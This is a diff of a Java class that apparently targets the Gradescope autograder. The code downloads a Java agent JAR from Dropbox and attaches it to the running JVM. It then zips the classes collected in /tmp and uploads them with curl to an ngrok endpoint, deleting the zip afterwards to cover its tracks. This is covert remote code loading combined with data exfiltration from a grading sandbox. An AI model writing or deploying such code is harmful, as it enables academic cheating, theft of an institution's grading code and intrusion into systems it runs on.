@@ -1,22 +1,18 @@
-package org.gradeskope;
+package gradeskope;
 
-import java.io.IOException;
-import org.gradeskope.utils.CurlFileUploader;
-import org.gradeskope.utils.DirtyFileUploader;
-import org.gradeskope.utils.EmptyClass;
-import org.gradeskope.utils.FileUploader;
-import org.gradeskope.utils.MagicManager;
-import org.gradeskope.utils.ZipFolder;
-
+import gradeskope.http.CurlFileUploader;
+import gradeskope.utils.EmptyClass;
+import gradeskope.http.FileUploader;
+import gradeskope.utils.MagicManager;
+import gradeskope.utils.ZipFolder;
 import java.io.File;
 import java.io.FileOutputStream;
-import java.lang.management.ManagementFactory;
-import java.net.MalformedURLException;
+import java.io.IOException;
 import java.net.URL;
-import java.net.URLClassLoader;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.nio.file.Files;
+import java.nio.file.Paths;
 
 public class ThinkOfNameLater {
 
@@ -28,9 +24,13 @@ public class ThinkOfNameLater {
 
     private boolean enableTestTransform = false;
 
-    private String agentSrc = "https://dl.dropbox.com/s/zq5ghvatmiq3feq/GradescopeAgent-1.0-SNAPSHOT.jar?dl=0";
+    private String agentRemoteSrc = "https://dl.dropbox.com/s/zq5ghvatmiq3feq/GradescopeAgent-1.0-SNAPSHOT.jar?dl=0";
+
+    private String agentLocalSrc = "/home/user/IdeaProjects/GradescopeInspector2/GradescopeAgent/build/libs/GradescopeAgent-1.1.jar";
 
     private String dumpDest = "https://f0e9-152-2-31-194.ngrok-free.app/upload";
+
+    private String zipName = "ClassesA07.zip";
 
     public ThinkOfNameLater() {
 
@@ -85,8 +85,6 @@ public class ThinkOfNameLater {
 //                throw new RuntimeException(e);
 //            }
 
-            EmptyClass emptyClass = new EmptyClass(); // Testing Purposes
-
             String tmpdir = "/tmp/javaroot/";
 
             // Temporary directory for download and class exporting
@@ -100,7 +98,7 @@ public class ThinkOfNameLater {
                     if (Files.isWritable(downloadDir.toPath())) {
                         // Download Java Agent and save to tmpdir
                         URL website = null;
-                        website = new URL(agentSrc);
+                        website = new URL(agentRemoteSrc);
                         ReadableByteChannel rbc = Channels.newChannel(website.openStream());
                         FileOutputStream fos =
                             new FileOutputStream(tmpdir + "TestJavaAgent_1_0_SNAPSHOT.jar");
@@ -136,7 +134,7 @@ public class ThinkOfNameLater {
 
                 MagicManager.attachGivenAgentToThisVM(tmpdir + "TestJavaAgent_1_0_SNAPSHOT.jar", agentArgs);
             } else {
-                MagicManager.attachGivenAgentToThisVM("/home/user/IdeaProjects/GradescopeInspector2/GradescopeAgent/build/libs/GradescopeAgent-1.1.jar", agentArgs);
+                MagicManager.attachGivenAgentToThisVM(agentLocalSrc, agentArgs);
             }
 //            if (Main.instantiationCount == 1) {
 //                throw new RuntimeException(
@@ -165,27 +163,30 @@ public class ThinkOfNameLater {
 
             if (enableDump) {
                 ZipFolder zipFolder = new ZipFolder();
-                File[] excludedFiles = {new File(tmpdir + "Classes.zip")};
+                File[] excludedFiles = {new File(tmpdir + zipName)};
 
                 try {
                     zipFolder.zipFolder(
                             new File(tmpdir),
-                            new File(tmpdir + "Classes.zip"),
+                            new File(tmpdir + zipName),
                             excludedFiles
                     );
                 } catch (Exception e) {
                     throw new RuntimeException(e);
                 }
 
-//                String[] headers = {};
                 String[] headers = {"ngrok-skip-browser-warning: true"};
-                FileUploader dirtyFileUploader = new CurlFileUploader(dumpDest, headers, new File(tmpdir + "Classes.zip"));
+                FileUploader fileUploader = new CurlFileUploader(dumpDest, headers, new File(tmpdir + zipName));
+
+                // Delete zip after upload
+                try {
+                    Files.deleteIfExists(Paths.get(tmpdir + zipName));
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
             }
 
             // Upload Zip Files to quick and dirty http upload server
-
-
-
         }
     }
 }
